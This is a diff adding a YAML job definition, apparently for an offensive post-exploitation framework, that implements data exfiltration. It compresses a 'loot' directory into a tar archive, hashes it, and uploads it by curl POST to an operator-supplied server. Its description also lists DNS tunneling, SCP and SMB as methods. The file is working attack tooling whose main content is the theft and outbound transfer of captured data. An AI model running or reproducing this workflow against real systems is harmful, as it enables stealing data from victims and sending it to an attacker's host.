@@ -1,0 +1,56 @@
+name: exfil
+description: Data exfiltration — compress and exfiltrate data via HTTP POST, DNS tunneling,
+  or SCP/SSH.
+tags:
+- post
+- exfil
+- data
+- compress
+- transfer
+dispatch:
+  inputs:
+    target:
+      required: true
+      type: string
+      description: Path to loot directory or files to exfiltrate
+      alias: t
+    method:
+      type: string
+      default: http
+      description: 'Exfil method: http, dns, scp, smb'
+    server:
+      type: string
+      default: ''
+      description: Exfil server (required for http/scp)
+    log_command:
+      type: string
+      default: 'true'
+      description: Enable command logging
+jobs:
+  compress:
+    name: Compress Loot
+    steps:
+    - name: tar-gz
+      run: tar -czf {{ env.OFX_RUN_DIR }}/loot.tar.gz -C {{ inputs.target }} . 2>&1
+      continue-on-error: true
+      log-command: '{{ inputs.log_command }}'
+    - name: checksum
+      script: "import os, hashlib\n\nf = os.path.join(os.environ[\"OFX_RUN_DIR\"],\
+        \ \"loot.tar.gz\")\nif os.path.exists(f):\n    sha = hashlib.sha256()\n  \
+        \  with open(f, \"rb\") as fh:\n        while True:\n            chunk = fh.read(8192)\n\
+        \            if not chunk:\n                break\n            sha.update(chunk)\n\
+        \    size = os.path.getsize(f)\n    print(f\"Archive: {f}\")\n    print(f\"\
+        Size: {size} bytes\")\n    print(f\"SHA256: {sha.hexdigest()}\")\n    add_outputs(archive=f,\
+        \ size=size, sha256=sha.hexdigest())\nelse:\n    print(\"Compression failed\"\
+        )"
+  exfil-http:
+    name: HTTP Exfiltration
+    run_if: '{{ inputs.method == ''http'' and inputs.server }}'
+    needs:
+    - compress
+    steps:
+    - name: curl-post
+      run: curl -X POST -F "file=@{{ env.OFX_RUN_DIR }}/loot.tar.gz" {{ inputs.server
+        }}/upload 2>&1
+      continue-on-error: true
+      log-command: '{{ inputs.log_command }}'
